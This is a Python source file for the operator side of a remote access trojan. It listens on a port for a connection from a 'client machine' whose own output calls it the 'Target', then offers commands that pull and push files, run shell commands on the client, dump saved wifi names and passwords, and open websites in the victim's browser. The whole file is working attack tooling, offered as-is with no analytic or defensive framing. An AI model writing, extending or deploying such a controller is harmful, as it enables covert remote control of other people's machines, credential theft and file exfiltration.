import socket,struct,sys,os;from datetime import datetime
try: input = raw_input
except NameError: input = input

class senrev:
    def __init__(self,sock):
        self.sock = sock
    def send(self, data):
        pkt = struct.pack('>I', len(data)) + data
        self.sock.sendall(pkt)
    def recv(self):
        pktlen = self.recvall(4)
        if not pktlen: return ""
        pktlen = struct.unpack('>I', pktlen)[0]
        return self.recvall(pktlen)
    def recvall(self, n):
        packet = b''
        while len(packet) < n:
            frame = self.sock.recv(n - len(packet))
            if not frame:return None
            packet += frame
        return packet

def help():
   print("""
Commands      Desscription
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
:help         Show this help message
:download     Download file from client machine
:upload       Upload file to client machine
:kill         Kill the connection with client machine
:exec         Run external command
:check        Check if client machine is connected to internet
:wifi         Show Client machine wifi info [names,passwod,etc]
:link       Open an website on client machine browser
pwd           Print working directory in client machine
cd -          Switch back to previous directory in client machine
cd --         Switch back to first directory when connection was established with client machine
""")
def download(filee):
  cmd = filee
  filee = "".join(filee.split(":download")).strip()
  if filee.strip():
   filetodown = filee.split("/")[-1] if "/" in filee else filee.split("\\")[-1] if "\\" in filee else filee
   controler.send(cmd.encode("UTF-8"))
   down = controler.recv().decode("UTF-8",'ignore')
   if down == "true":
     print("[~] Downloading [ {} ]...".format(filetodown))
     wf = open(filetodown, "wb")
     while True:
      data = controler.recv()
      if data == b":DONE:": break
      elif data == b":Aborted:":
        wf.close()
        os.remove(filetodown)
        print("[!] Downloading Has Canceled By Target!")
        return
      wf.write(data)
     wf.close()
     print("[*] Download Complete :)\n[*] file Saved In : {}\n".format(os.getcwd()+os.sep+filetodown))
   else: print(down)
  else: print("Usage: :download <download_a_file_from_client_machine>\n")
def upload(cmd):
    filetoup = "".join(cmd.split(":upload")).strip()
    if not filetoup.strip(): print("usage: :upload <file_to_upload>\n")
    else:
       if not os.path.isfile(filetoup): print("error: open: no such file: "+filetoup+"\n")
       else:
          controler.send(cmd.encode("UTF-8"))
          print("[~] Uploading [ {} ]...".format(filetoup))
          with open(filetoup,"rb") as wf:
            for data in iter(lambda: wf.read(4100), b""):
              try:controler.send(data)
              except(KeyboardInterrupt,EOFError):
                wf.close()
                controler.send(b":Aborted:")
                print("[!] Uploading Has Been Canceled By User!\n")
                return
          controler.send(b":DONE:")
          savedpath = controler.recv().decode("UTF-8")
          print("[*] Upload Complete :)\n[*] File uploaded in : "+str(savedpath).strip()+" in client machine\n")

def check_con():
     print("[~] Checking....")
     controler.send(b":check_internet_connection")
     status = controler.recv().decode("UTF-8").strip()
     if status == "UP": print("[*] client: Connected to internet !\n")
     else: print("[!] client: Not Connected to internet !\n")

def link(cmd):
  url = "".join(cmd.split(":link")).strip()
  if not url.strip(): print("Usage: :link <Websute_URL>\n")
  else:
    if not url.startswith(("http://","https://")): url = "http://"+url
    print("[~] Opening [ {} ]...".format(url))
    controler.send(":link {}".format(url).encode("UTF-8"))
    print("[*] Done \n")

def control():
    try:
      cmd = str(input("[{}]:~# ".format(a[0])))
      while not cmd.strip(): cmd = str(input("[{}]:~# ".format(a[0])))
      if cmd == ":help":
            help()
            control()
      elif ":download" in cmd:
            download(cmd)
            control()
      elif ":upload" in cmd:
           upload(cmd)
           control()
      elif cmd ==":kill":
         print("[!] Connection has been killed!")
         controler.send(b":kill")
         c.shutdown(2)
         c.close()
         s.close()
         exit(1)
      elif ":exec" in cmd:
           cmd = "".join(cmd.split(":exec")).strip()
           if not cmd.strip(): print("Usage: :exec <command>\n")
           else:
               print("[*] exec:")
               os.system(cmd)
               print(" ")
           control()
      elif cmd == ":check":
        check_con()
        control()
      elif cmd == ":wifi":
        print("[*] Getting Wifi profiles info...")
        controler.send(b":wifi")
        info = controler.recv()
        try:
          info = info.decode("UTF-8","ignore")
        except  UnicodeEncodeError: info = info
        finally:
           if info==":osnot:": print("[!] Faild To Get Wifi Info!\n")
           else:
             print("[*] INFO:\n")
             print(info + "\n")
             control()
      elif ":link" in cmd:
        link(cmd)
        control()
      elif cmd.lower() == "cls" or cmd == "clear":
             os.system("cls||clear")
             control()
      controler.send(cmd.encode("UTF-8"))
      DATA = controler.recv()
      if DATA.strip(): print(DATA.decode("UTF-8",'ignore'))
      control()
    except (KeyboardInterrupt, EOFError):
           print(" ")
           control()
    except socket.error:
       print("[!] The Connection Is Lost: "+a[0]+" !")
       c.close()
       s.close()
       exit(1)
    except UnicodeEncodeError:
        print(DATA)
        print(" ")
        control()
    except Exception as e:
       print("[!] There Is An Error : "+str(e)+"\n")
       control()

def server(IP,PORT,senrev=senrev):
  global s
  global c
  global a
  global controler
  s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  s.bind((IP,PORT))
  s.listen(1)
  print("[*] Server started on > {}:{} < | at [{}]".format(IP,PORT,datetime.now().strftime("%H:%M:%S")))
  try:
    c,a = s.accept()
    controler = senrev(c)
    print("\n[*] Connection From {}:{}".format(a[0],a[1]))
    print("[*] type ':help' to show help message\n")
    control()
  except (KeyboardInterrupt,EOFError):
         print(" ")
         exit(1)
if len(sys.argv) !=3:
        print("Usage: listen < Your IP > <Chose any PORT>")
        print("Important !!!")
        print("If you are using a over wan ip please just put your local ip")
        exit(1)
server(sys.argv[1],int(sys.argv[2]))